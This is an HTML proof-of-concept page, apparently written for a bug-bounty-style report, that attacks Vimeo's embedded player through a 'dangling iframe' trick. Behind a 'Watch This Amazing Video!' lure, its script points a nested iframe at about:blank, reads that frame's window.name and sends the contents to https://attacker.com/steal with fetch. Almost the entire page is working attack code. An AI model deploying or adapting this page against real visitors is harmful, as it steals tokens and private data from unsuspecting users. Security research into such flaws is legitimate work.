<!DOCTYPE html>
<html>
<head>
    <title>Vimeo Token Theft via Dangling iframe</title>
</head>
<body>
    <h1>ðŸŽ¬ Watch This Amazing Video!</h1>
    
    <!-- Step 1: Embed Vimeo player with controlled name parameter -->
    <iframe 
        id="vimeo"
        src="https://player.vimeo.com/video/935884964"
        name="vimeoPlayer"
        width="640" 
        height="360">
    </iframe>

    <div id="results"></div>

    <script>
        const vimeoFrame = document.getElementById('vimeo');
        
        // Wait for iframe to load
        setTimeout(() => {
            console.log('Step 1: Vimeo iframe loaded');
            
            // Step 2: Try to access nested iframes within Vimeo player
            // Vimeo player might have nested iframes for ads, analytics, etc.
            tryDanglingAttack();
        }, 3000);

        function tryDanglingAttack() {
            try {
                const vimeoWindow = vimeoFrame.contentWindow;
                
                // Check if there are nested iframes
                console.log('Checking for nested iframes...');
                
                // Try to access nested iframe (if exists)
                if (vimeoWindow[0]) {
                    console.log('Found nested iframe!');
                    
                    // Change nested iframe to about:blank
                    // This changes ownership to OUR origin
                    vimeoWindow[0].location = 'about:blank';
                    
                    // Wait a moment for the change
                    setTimeout(() => {
                        try {
                            // Now we can read window.name!
                            const leakedData = vimeoWindow[0].name;
                            console.log('ðŸš¨ LEAKED DATA:', leakedData);
                            
                            document.getElementById('results').innerHTML = 
                                '<h2>ðŸš¨ Data Leaked!</h2><pre>' + 
                                leakedData + 
                                '</pre>';
                            
                            // Exfiltrate
                            fetch('https://attacker.com/steal', {
                                method: 'POST',
                                body: leakedData
                            });
                            
                        } catch(e) {
                            console.log('Cannot read window.name:', e.message);
                        }
                    }, 500);
                    
                } else {
                    console.log('No nested iframes found');
                }
                
            } catch(e) {
                console.log('Error:', e.message);
            }
        }
    </script>
</body>
</html>
